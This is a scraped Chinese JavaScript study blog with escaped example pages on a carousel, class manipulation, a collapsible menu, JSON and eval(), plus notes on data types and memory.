(window.getComputedStyle) &#123; /* 这里window.属性 用的很巧妙，因为属性不存在返回undefined 而不加window代表变量，层层寻找没有后会报错 */ return getComputedStyle(obj, null)[name]; &#125; else &#123; return obj.currentStyle[name]; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;container&quot;&gt; &lt;ul id=&quot;imgList&quot;&gt; &lt;li&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 134 轮播图——点击跳转123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; * &#123; margin: 0; padding: 0; &#125; /* * 设置outer的样式 */ #outer &#123; /*设置宽和高*/ width: 520px; height: 333px; /*居中*/ margin: 50px auto; /*设置背景颜色*/ background-color: greenyellow; /*设置padding*/ padding: 10px 0; /*开启相对定位*/ position: relative; /*裁剪溢出的内容*/ overflow: hidden; &#125; /*设置imgList*/ #imgList &#123; /*去除项目符号*/ list-style: none; /*设置ul的宽度*/ /*width: 2600px;*/ /*开启绝对定位*/ position: absolute; /*设置偏移量*/ /* * 每向左移动520px，就会显示到下一张图片 */ left: 0px; &#125; /*设置图片中的li*/ #imgList li &#123; /*设置浮动*/ float: left; /*设置左右外边距*/ margin: 0 10px; &#125; /*设置导航按钮*/ #navDiv &#123; /*开启绝对定位*/ position: absolute; /*设置位置*/ bottom: 15px; /*设置left值 outer宽度 520 navDiv宽度 25*5 = 125 520 - 125 = 395/2 = 197.5 * */ /*left: 197px;*/ &#125; #navDiv a &#123; /*设置超链接浮动*/ float: left; /*设置超链接的宽和高*/ width: 15px; height: 15px; /*设置背景颜色*/ background-color: red; /*设置左右外边距*/ margin: 0 5px; /*设置透明*/ opacity: 0.5; /*兼容IE8透明*/ filter: alpha(opacity=50); &#125; /*设置鼠标移入的效果*/ #navDiv a:hover &#123; background-color: black; &#125; &lt;/style&gt; &lt;!--引用工具--&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/tools.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; //获取imgList var imgList = document.getElementById(&quot;imgList&quot;); //获取页面中所有的img标签 var imgArr = document.getElementsByTagName(&quot;img&quot;); //设置imgList的宽度 imgList.style.width = 520 * imgArr.length + &quot;px&quot;; /*设置导航按钮居中*/ //获取navDiv var navDiv = document.getElementById(&quot;navDiv&quot;); //获取outer var outer = document.getElementById(&quot;outer&quot;); //设置navDiv的left值 navDiv.style.left = (outer.offsetWidth - navDiv.offsetWidth) / 2 + &quot;px&quot;; //默认显示图片的索引 var index = 0; //获取所有的a var allA = document.getElementsByTagName(&quot;a&quot;); //设置默认选中的效果 allA[index].style.backgroundColor = &quot;black&quot;; /* 点击超链接切换到指定的图片 点击第一个超链接，显示第一个图片 点击第二个超链接，显示第二个图片 * */ //为所有的超链接都绑定单击响应函数 for (var i = 0; i &lt; allA.length; i++) &#123; //为每一个超链接都添加一个num属性 allA[i].num = i; //为超链接绑定单击响应函数 allA[i].onclick = function () &#123; //获取点击超链接的索引,并将其设置为index index = this.num; //切换图片 /* * 第一张 0 0 * 第二张 1 -520 * 第三张 2 -1040 */ //imgList.style.left = -520*index + &quot;px&quot;; //设置选中的a setA(); //使用move函数来切换图片 move(imgList, &quot;left&quot;, -520 * index, 20, function () &#123; &#125;); &#125;; &#125; //创建一个方法用来设置选中的a function setA() &#123; //遍历所有a，并将它们的背景颜色设置为红色 for (var i = 0; i &lt; allA.length; i++) &#123; // allA[i].style.backgroundColor = &quot;red&quot;; // 会导致内联样式hover失效 allA[i].style.backgroundColor = &quot;&quot;; &#125; //将选中的a设置为黑色 allA[index].style.backgroundColor = &quot;black&quot;; &#125;; &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 创建一个外部的div，来作为大的容器 --&gt; &lt;div id=&quot;outer&quot;&gt; &lt;!-- 创建一个ul，用于放置图片 --&gt; &lt;ul id=&quot;imgList&quot;&gt; &lt;li&gt;&lt;img src=&quot;img/1.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;img/2.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;img/3.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;img/4.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;img/5.jpg&quot; /&gt;&lt;/li&gt; &lt;/ul&gt; &lt;!--创建导航按钮--&gt; &lt;div id=&quot;navDiv&quot;&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273//尝试创建一个可以执行简单动画的函数/* * 参数： * obj:要执行动画的对象 * attr:要执行动画的样式，比如：left top width height * target:执行动画的目标位置 * speed:移动的速度(正数向右移动，负数向左移动) * callback:回调函数，这个函数将会在动画执行完毕以后执行 */function move(obj, attr, target, speed, callback) &#123; //关闭上一个定时器 clearInterval(obj.timer); //获取元素目前的位置 var current = parseInt(getStyle(obj, attr)); //判断速度的正负值 //如果从0 向 800移动，则speed为正 //如果从800向0移动，则speed为负 if(current &gt; target) &#123; //此时速度应为负值 speed = -speed; &#125; //开启一个定时器，用来执行动画效果 //向执行动画的对象中添加一个timer属性，用来保存它自己的定时器的标识 obj.timer = setInterval(function() &#123; //获取box1的原来的left值 var oldValue = parseInt(getStyle(obj, attr)); //在旧值的基础上增加 var newValue = oldValue + speed; //判断newValue是否大于800 //从800 向 0移动 //向左移动时，需要判断newValue是否小于target //向右移动时，需要判断newValue是否大于target if((speed &lt; 0 &amp;&amp; newValue &lt; target) || (speed &gt; 0 &amp;&amp; newValue &gt; target)) &#123; newValue = target; &#125; //将新值设置给box1 obj.style[attr] = newValue + &quot;px&quot;; //当元素移动到0px时，使其停止执行动画 if(newValue == target) &#123; //达到目标，关闭定时器 clearInterval(obj.timer); //动画执行完毕，调用回调函数 callback &amp;&amp; callback(); &#125; &#125;, 30);&#125;/* * 定义一个函数，用来获取指定元素的当前的样式 * 参数： * obj 要获取样式的元素 * name 要获取的样式名 */function getStyle(obj, name) &#123; if(window.getComputedStyle) &#123; //正常浏览器的方式，具有getComputedStyle()方法 return getComputedStyle(obj, null)[name]; &#125; else &#123; //IE8的方式，没有getComputedStyle()方法 return obj.currentStyle[name]; &#125;&#125; 134 轮播图——教程完整123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; * &#123; margin: 0; padding: 0; &#125; /* * 设置outer的样式 */ #outer &#123; /*设置宽和高*/ width: 520px; height: 333px; /*居中*/ margin: 50px auto; /*设置背景颜色*/ background-color: greenyellow; /*设置padding*/ padding: 10px 0; /*开启相对定位*/ position: relative; /*裁剪溢出的内容*/ overflow: hidden; &#125; /*设置imgList*/ #imgList &#123; /*去除项目符号*/ list-style: none; /*设置ul的宽度*/ /*width: 2600px;*/ /*开启绝对定位*/ position: absolute; /*设置偏移量*/ /* * 每向左移动520px，就会显示到下一张图片 */ left: 0px; &#125; /*设置图片中的li*/ #imgList li &#123; /*设置浮动*/ float: left; /*设置左右外边距*/ margin: 0 10px; &#125; /*设置导航按钮*/ #navDiv &#123; /*开启绝对定位*/ position: absolute; /*设置位置*/ bottom: 15px; /*设置left值 outer宽度 520 navDiv宽度 25*5 = 125 520 - 125 = 395/2 = 197.5 * */ /*left: 197px;*/ &#125; #navDiv a &#123; /*设置超链接浮动*/ float: left; /*设置超链接的宽和高*/ width: 15px; height: 15px; /*设置背景颜色*/ background-color: red; /*设置左右外边距*/ margin: 0 5px; /*设置透明*/ opacity: 0.5; /*兼容IE8透明*/ filter: alpha(opacity=50); &#125; /*设置鼠标移入的效果*/ #navDiv a:hover &#123; background-color: black; &#125; &lt;/style&gt; &lt;!--引用工具--&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/tools.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; //获取imgList var imgList = document.getElementById(&quot;imgList&quot;); //获取页面中所有的img标签 var imgArr = document.getElementsByTagName(&quot;img&quot;); //设置imgList的宽度 imgList.style.width = 520 * imgArr.length + &quot;px&quot;; /*设置导航按钮居中*/ //获取navDiv var navDiv = document.getElementById(&quot;navDiv&quot;); //获取outer var outer = document.getElementById(&quot;outer&quot;); //设置navDiv的left值 navDiv.style.left = (outer.offsetWidth - navDiv.offsetWidth) / 2 + &quot;px&quot;; //默认显示图片的索引 var index = 0; //获取所有的a var allA = document.getElementsByTagName(&quot;a&quot;); //设置默认选中的效果 allA[index].style.backgroundColor = &quot;black&quot;; /* 点击超链接切换到指定的图片 点击第一个超链接，显示第一个图片 点击第二个超链接，显示第二个图片 * */ //为所有的超链接都绑定单击响应函数 for (var i = 0; i &lt; allA.length; i++) &#123; //为每一个超链接都添加一个num属性 allA[i].num = i; //为超链接绑定单击响应函数 allA[i].onclick = function () &#123; // 关闭自动切换定时器 clearInterval(timer); //获取点击超链接的索引,并将其设置为index index = this.num; //切换图片 /* * 第一张 0 0 * 第二张 1 -520 * 第三张 2 -1040 */ //imgList.style.left = -520*index + &quot;px&quot;; //设置选中的a setA(); //使用move函数来切换图片 move(imgList, &quot;left&quot;, -520 * index, 20, function () &#123; // 动画执行完毕，开启自动切换 autoChange(); &#125;); &#125;; &#125; // 开启定时切换 autoChange(); function setA() &#123; //创建一个方法用来设置选中的a // 处理循环播放的hover效果显示 if (index &gt;= imgArr.length - 1) &#123; index = 0; // 此时显示的是最后一张图片，而最后一张图片和第一张是一摸一样的，通过CSS将最后一张切换为第一张 imgList.style.left = &quot;0px&quot;; &#125; //遍历所有a，并将它们的背景颜色设置为红色 for (var i = 0; i &lt; allA.length; i++) &#123; // allA[i].style.backgroundColor = &quot;red&quot;; // 会导致内联样式hover失效 allA[i].style.backgroundColor = &quot;&quot;; &#125; //将选中的a设置为黑色 allA[index].style.backgroundColor = &quot;black&quot;; &#125;; var timer; function autoChange() &#123; // 创建自动切换函数，用来开启自动切换图片 timer = setInterval(() =&gt; &#123; // 索引自增 index++; index %= imgArr.length; // 执行动画的切换 move(imgList, &quot;left&quot;, -520 * index, 30, function () &#123; // 修改导航点 setA(); &#125;); &#125;, 2000) &#125; &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 创建一个外部的div，来作为大的容器 --&gt; &lt;div id=&quot;outer&quot;&gt; &lt;!-- 创建一个ul，用于放置图片 --&gt; &lt;ul id=&quot;imgList&quot;&gt; &lt;li&gt;&lt;img src=&quot;img/1.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;img/2.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;img/3.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;img/4.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;img/5.jpg&quot; /&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=&quot;img/1.jpg&quot; /&gt;&lt;/li&gt; &lt;/ul&gt; &lt;!--创建导航按钮--&gt; &lt;div id=&quot;navDiv&quot;&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 137 类的操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;类的操作&lt;/title&gt; &lt;style&gt; .b1 &#123; width: 100px; height: 100px; background-color: #8080ff; &#125; .b2 &#123; width: 50px; height: 50px; background-color: lightcoral; &#125; .b3 &#123; border-radius: 20%; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; var btn01 = document.getElementById(&quot;btn01&quot;); var box = document.getElementById(&quot;box&quot;); btn01.onclick = function () &#123; // 单机响应函数 /* 通过sytle属性来修改元素的样式，每修改一个样式，浏览器都需要重新渲染一次页面 这样的执行性能较差，而且这种形式当我们要修改多个样式时，也不太方便，还存在代码耦合问题，所以不建议这样修改样式 box.style.background = &quot;cyan&quot;; box.style.height = &quot;300px&quot;; box.style.width = &quot;300px&quot;; */ /* 一行代码修改多个样式 我们希望一行代码修改多个样式 */ // 修改box的属性 // box.className = &quot;b2&quot;; /* 我们可以通过修改元素的class属性来间接的修改样式 这样一来，我们只需要修改一次，既可以同时修改多个样式，此时浏览器只需要重新渲染页面一次，性能较高，并且这种方式表现和行为进一步分离 但是存在问题： .b1 &#123; width: 100px; height: 100px; background-color: #8080ff; &#125; .b2 &#123; height: 50px; background-color: lightcoral; &#125; b2覆盖b1后，width效果会消失 */ addClass(box, &quot;b3&quot;); // deleteClass(box, &quot;b2&quot;); toggleClass(box, &quot;b2&quot;); &#125; &#125; function addClass(obj, cn) &#123; /* 定义一个函数，用来向一个元素添加指定的class属性值 参数： obj：要添加class属性的元素 cn：要添加的class值 */ // 限制已有效果添加 if (hasClass(obj, cn)) &#123; obj.className += &quot; &quot; + cn; &#125; &#125; function hasClass(obj, cn) &#123; // 判断一个元素中是否有指定的class属性值 var reg = new RegExp(&quot;\\\\b&quot; + cn + &quot;\\\\b&quot;); // \\b为单词边界 if (reg.test(obj.className)) &#123; return false; &#125; else &#123; return true; &#125; &#125; function deleteClass(obj, cn) &#123; /* 删除一个元素中指定的class属性值 */ var reg = new RegExp(&quot;\\\\b&quot; + cn + &quot;\\\\b&quot;); obj.className = obj.className.replace(reg, &quot;&quot;); &#125; function toggleClass(obj, cn) &#123; /* toggleClass可以用来切换一个类 如果元素中有该类，则删除 如果元素中没有该类则添加 */ if (hasClass(obj, cn)) &#123; addClass(obj, cn); &#125; else &#123; deleteClass(obj, cn); &#125; console.log(&quot;d&quot;); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;btn01&quot;&gt;修改box样式&lt;/button&gt; &lt;div id=&quot;box&quot; class=&quot;b1&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 138 二级菜单123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;二级菜单&lt;/title&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;二级菜单&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; * &#123; margin: 0; padding: 0; list-style-type: none; &#125; a, img &#123; border: 0; text-decoration: none; &#125; body &#123; font: 12px/180% Arial, Helvetica, sans-serif, &quot;新宋体&quot;; &#125; &lt;/style&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/sdmenu.css&quot;&gt; &lt;script src=&quot;./js/tools.js&quot;&gt;&lt;/script&gt; &lt;script&gt; window.onload = function () &#123; /* 我们的每一个菜单都是一个div 当div具有collapsed这个类时，div就是折叠状态 当div没有这个类时，div就是展开状态 */ /* 点击菜单，切换菜单状态 */ var menuSpan = document.querySelectorAll(&quot;.menuSpan&quot;); // 保存当前打开的菜单 var openDiv = menuSpan[0].parentNode; for (var i = 0; i &lt; menuSpan.length; i++) &#123; menuSpan[i].onclick = function () &#123; // 获取当前span的父元素 var parentDiv = this.parentNode; // 切换状态 toggleMenu(parentDiv); // 打开菜单后，应该关闭之前的展开的菜单 if (openDiv != parentDiv &amp;&amp; hasClass(openDiv, &quot;collapsed&quot;)) &#123; // 打开菜单后，应该关闭之前打开的菜单 /* 为了可以统一处理动画的过渡效果，我们希望在这将addClass改为toggleClass 此处toggleClass()不需要有移除功能 */ // addClass(openDiv, &quot;collapsed&quot;); // toggleClass(openDiv, &quot;collapsed&quot;); // 折叠动态效果 toggleMenu(openDiv); &#125; openDiv = parentDiv; &#125;; &#125; /* 切换菜单后的折叠拉伸效果 */ function toggleMenu(obj) &#123; // 在切换之前获取元素高度 var begin = obj.offsetHeight; // 关闭parentDiv toggleClass(obj, &quot;collapsed&quot;); // 在切换类之后获取一个高度 var end = obj.offsetHeight; /* 动画效果就是将高度从begin向end过渡 将元素的高度重置为begin */ obj.style.height = begin + &quot;px&quot;; // 执行动画，从begin向end过渡 move(obj, &quot;height&quot;, end, 10, function () &#123; // 动画执行完毕，内联样式没有存在意义，需要删除 obj.style.height = &quot;&quot;; &#125;); &#125; &#125; &lt;/script&gt; &lt;/head&gt;&lt;body&gt; &lt;div id=&quot;my_menu&quot; class=&quot;sdmenu&quot;&gt; &lt;div&gt; &lt;span class=&quot;menuSpan&quot;&gt;在线工具&lt;/span&gt; &lt;a href=&quot;#&quot;&gt;图像优化&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;收藏夹图标生成器&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;邮件&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;htaccess密码&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;梯度图像&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;按钮生成器&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;collapsed&quot;&gt; &lt;span class=&quot;menuSpan&quot;&gt;支持我们&lt;/span&gt; &lt;a href=&quot;#&quot;&gt;推荐我们&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;链接我们&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;网络资源&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;collapsed&quot;&gt; &lt;span class=&quot;menuSpan&quot;&gt;合作伙伴&lt;/span&gt; &lt;a href=&quot;#&quot;&gt;JavaScript工具包&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;CSS驱动&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;CodingForums&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;CSS例子&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;collapsed&quot;&gt; &lt;span class=&quot;menuSpan&quot;&gt;测试电流&lt;/span&gt; &lt;a href=&quot;#&quot;&gt;Current or not&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;Current or not&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;Current or not&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;Current or not&lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 140 JSON1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;JSON&lt;/title&gt; &lt;script&gt; /* JSON - JS中的对象只有JS自己认识，其他语言不认识 - JSON就是一个特殊格式的字符串，这个字符串可以被任意语言识别，并且可以转换为任意语言中的对象，JSON在开发中主要用来进行数据的交互 - JSON JavaScript Object Notation对象表示法 - JSON和JS对象的格式一致，只不过JSON字符串中的属性名必须加双引!!! - 其他的和JS语法一致 - JSON分类： - 数组&#123;&#125; - 对象[] - JSON中允许的值 - 字符串 - 数值 - 对象,普通对象，不能时函数 - null - 数组 - 布尔值 */ var obj = &#x27;&#123;&quot;name&quot;:&quot;ycy&quot;,&quot;age&quot;:18,&quot;gender&quot;:&quot;girl&quot;&#125;&#x27;; var obj2 = &#123; name: &quot;ycy&quot;, age: 18, gender: &quot;girl&quot; &#125;; var arr = &#x27;[1,2,3,4,&quot;hello&quot;,true]&#x27;; /* 将JSON字符串转换为JS中的对象 在JS中，为我们提供了一个工具类，就叫JSON 这个对象可以帮助我们将一个JS对象转化为JSON格式，也可以将一个JSON格式对象转化为JS对象 JSON.parse() - 可以将JSON字符串转换为JS对象 - 需要一个JSON字符串作为对象，会将该字符串转换为JS对象后返回 JSON.stringify() - 可以将一个JS对象转换为JSON字符串 - 需要一个JS对象作为参数，会返回一个JSON字符串 JSON这个对象在IE7及其以下不支持 */ var o = JSON.parse(obj); console.log(o); var o2 = JSON.parse(arr); console.log(o2); var json1 = JSON.stringify(obj2); console.log(json1); &lt;/script&gt; &lt;style&gt; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 兼容IE 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;JSON&lt;/title&gt; &lt;!-- 如果要兼容IE7及其以下的JSON操作，则可以通过引入一个外部js文件实现 --&gt; &lt;script src=&quot;./js/json2.js&quot;&gt;&lt;/script&gt; &lt;script&gt; var obj = &#x27;(&#123;&quot;name&quot;:&quot;ycy&quot;,&quot;age&quot;:18,&quot;gender&quot;:&quot;girl&quot;&#125;)&#x27;; /* eval() - 这个函数可以用来执行一段字符串形式的JS代码，并将执行结果返回 - 如果使用eval()执行的字符串中含有&#123;&#125;，它会将&#123;&#125;当做代码块，如果不希望将其当做代码块解析，则需要在字符串前后各加一个括号 - eval()这个函数功能强大，可以直接执行一个字符串中的JS代码，但是在开发中尽量不要使用，首先性能差，其次有安全隐患 */ // var str = &quot;alert(&#x27;hello&#x27;);&quot;; // eval(str); var obj = eval(&#x27;(&#x27; + obj + &#x27;)&#x27;); console.log(obj); &lt;/script&gt; &lt;style&gt;&lt;/style&gt; &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; JavaScript高级基础深入总结02 基本数据类型12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;01_数据类型&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--1. 分类(2大类) * 基本(值)类型 * Number: 任意数值 * String: 任意文本 * Boolean: true/false * undefined: undefined * null: null * 对象(引用)类型 * Object: 任意对象 * Array: 特别的对象类型(下标/内部数据有序) * Function: 特别的对象类型(可执行)2. 判断 * typeof: * 可以区别: 数值, 字符串, 布尔值, undefined, function * 不能区别: null与对象, 一般对象与数组 * instanceof * (a instanceof b)判断对象a是否为构造函数b的实例 * 专门用来判断对象数据的类型: Object, Array与Function * === * 可以判断: undefined和null--&gt; &lt;script type=&quot;text/javascript&quot;&gt; // typeof: 返回的是数据类型的字符串表达形式 //1. 基本类型 var a console.log(a, typeof a, a === undefined) // undefined &#x27;undefined&#x27; true console.log(a === typeof a) // false a = 3 console.log(typeof a === &#x27;number&#x27;) a = &#x27;atguigu&#x27; console.log(typeof a === &#x27;string&#x27;) a = true console.log(typeof a === &#x27;boolean&#x27;) a = null console.log(a === null) // true console.log(typeof a) // &#x27;object&#x27; console.log(&#x27;--------------------------------&#x27;) //2. 对象类型 var b1 = &#123; b2: [2, &#x27;abc&#x27;, console.log], b3: function () &#123; console.log(&#x27;b3()&#x27;) &#125; &#125; console.log(b1 instanceof Object, typeof b1) // true &#x27;object&#x27; console.log(b1.b2 instanceof Array, typeof b1.b2) // true &#x27;object&#x27; console.log(b1.b3 instanceof Function, typeof b1.b3) // true &#x27;function&#x27; console.log(typeof b1.b2[2]) // &#x27;function&#x27; console.log(b1.b2[2](&#x27;abc&#x27;)) // &#x27;abc&#x27; undefined &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 03 相关问题1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;01_相关问题&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--1. undefined与null的区别? * undefined代表定义了但是没有赋值 * null代表已经赋值, 只是值为null2. 什么时候给变量赋值为null呢? * var a = null //初始化赋值，a将指向一个对象, 但对象此时还没有确定 * a = null //让a指向的对象成为垃圾对象，以便被垃圾回收器回收，释放内存3. 严格区别变量类型与数据类型? * js的变量本身是没有类型的, 变量的类型实际上是变量内存中数据的类型 * 变量类型: * 基本类型: 保存基本类型数据的变量 * 引用类型: 保存对象地址值的变量 * 数据对象 * 基本类型 * 对象类型--&gt; &lt;script type=&quot;text/javascript&quot;&gt; // 实例：实例对象 // 类型：类型对象 function Person(name, age) &#123; // 构造函数 类型：对象 this.name = name this.age = age &#125; var p = new Person(&quot;张加林&quot;, 20) // 根据类型创建的实例对象 /* 最好不要直接使用Person(&quot;张加林&quot;, 20)调用构造函数 */ console.log(p) // 1. undefined与null的区别? var a1 var a2 = null console.log(a1, a2) // 2. 什么时候给变量赋值为null呢? //初始 var a3 = null //中间 var name = &#x27;Tom&#x27; var age = 12 a3 = &#123; name: name, age: age &#125; //结束 a3 = null &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 04 数据、变量、内存123456789101112131415161718192021222324252627&lt;!-- 1.什么是数据？ * 存储在内存中代表特定信息，本质上是二进制串01010…… * 数据的特点：可传递性，可运算性 * 一切皆数据，内存中，所有操作的目标：数据 * 算数运算 * 逻辑运算 * 赋值 * 运行函数 2.什么是内存？ * 内存条通电后产生的可存储数据的空间（临时，断电后消失） * 内存产生和死亡：内存条(集成电路板)==&gt;通电==&gt;产生一定容量的存储空间==&gt;存储各种数据==&gt;断电==&gt;内存全部消失 * 一块小内存的2个数据： * 内部存储的数据 * 内存地址数据 * 内存的分类 * 栈：存储全局变量和局部变量（空间较小） * 堆：存储对象（空间较大） 3.什么是变量？ * 可变化的量，由变量名和变量值组成 * 每个变量都对应着一块小内存，变量名用来查找对应的内存，变量值就是内存中保存的数据（数据可能是） 4.内存、数据、变量三者之间的关系 * 内存用来存储数据的空间 * 变量是内存的标识 5.代码执行 * 将代码取入内存，编译，解析执行 --&gt; 05 相关问题123456789 &lt;!-- 问题: var a = xxx, a内存中到底保存的是什么? * xxx是一个基本数据 * 保存的就是这个数据 * xxx是一个对象 * 保存的是对象的地址值 * xxx是一个变量 * 取决于xxx变量保存的数据的位置--&gt; 关于引用变量赋值问题123456789101112131415161718192021222324252627282930313233343536373839&lt;body&gt; &lt;!--关于引用变量赋值问题 * 多个个引用变量指向同一个对象, 通过一个引用变量修改对象内部数据, 其他所有引用变量也看得见 * 2个引用变量指向同一个对象,让一个引用变量指向另一个对象, 另一个引用变量还是指向原来的对象--&gt; &lt;script type=&quot;text/javascript&quot;&gt; //1. 2个引用变量指向同一个对象, 通过一个引用变量修改对象内部数据, 另一个引用变量也看得见 var obj1 = &#123;&#125; var obj2 = obj1 obj2.name = &#x27;Tom&#x27; 